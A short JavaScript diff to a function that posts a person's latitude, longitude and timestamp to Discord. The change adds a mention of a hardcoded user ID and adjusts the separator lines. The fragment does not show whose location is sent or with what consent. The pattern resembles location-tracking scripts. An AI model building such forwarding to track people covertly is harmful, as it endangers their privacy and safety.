@@ -240,12 +240,13 @@ const janisUID = '789782857852911616';
 function sendToDiscord(latitude, longitude) {
   const payload = {
     content: `
-======================================    
+===================================
+<@${janisUID}>    
 Location Details:
 Latitude: ${latitude} 
 Longitude: ${longitude}
 Timestamp: ${new Date().toISOString()}
-======================================
+===================================
 `
   };
 
